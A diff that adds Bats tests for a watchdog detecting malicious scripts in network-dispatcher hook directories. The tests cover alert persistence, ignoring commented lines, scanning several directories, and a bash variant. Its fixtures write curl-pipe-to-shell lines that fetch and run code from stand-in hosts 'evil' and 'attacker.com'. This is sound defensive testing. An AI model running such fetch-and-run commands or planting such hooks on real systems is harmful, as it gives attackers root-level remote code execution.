@@ -216,3 +216,46 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-network-dispatcher -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): network-dispatcher-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # Network-event-triggered root-exec persistence — alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD}/99-evil"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"network_dispatcher_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# example attack: curl http://evil/x | sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    ! cap | grep -q '"event":"network_dispatcher_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: NetworkManager + networkd-dispatcher + ifupdown axes — injection in ANY → alert)" {
+    DISPD2="${TMP}/ifupdown.d"; mkdir -p "${DISPD2}"
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    DIRS="${DISPD} ${DISPD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD2}/99-evil-ifupdown"
+    DIRS="${DISPD} ${DISPD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${DISPD}/99-evil"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
